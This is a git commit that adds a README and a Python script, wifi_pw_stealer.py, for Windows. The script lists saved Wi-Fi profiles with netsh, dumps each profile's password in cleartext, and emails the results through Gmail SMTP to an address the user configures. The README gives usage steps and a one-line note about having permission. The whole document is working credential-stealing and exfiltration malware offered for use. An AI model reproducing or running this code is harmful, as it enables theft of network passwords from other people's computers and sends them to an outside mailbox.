d6756ba6919ac20f21fd3442b3beeb185d31da97
Chris Von Wilpert <vonwilpertc@gmail.com>
2022-05-02 18:16:27 -0700

    first commit

---
+++ README.txt
@@ -0,0 +1,5 @@
+Only run this on computers that you have permission to run it on.
+
+Enter in the gmail account that you want to send the wifi passwords to at the bottom of the script (only works with gmail accounts).
+
+Run the python script on any windows computer that has a Python intepretor installed on it.
---
+++ wifi_pw_stealer.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python
+
+import subprocess, smtplib, re
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+command = "netsh wlan show profile"
+#networks = subprocess.check_output(command, shell=True, encoding='utf8')
+networks = subprocess.check_output(command, shell=True)
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode('utf-8'))
+
+result =""
+for network_name in network_names_list:
+    # Added quotes around network_name to handle spaces in SSID
+    command = "netsh wlan show profile " +'"'+network_name+'"'+ " key=clear"
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + str(current_result)
+#print(result)
+send_mail("yourgmail@gmail.com", "youremailpassword", result)
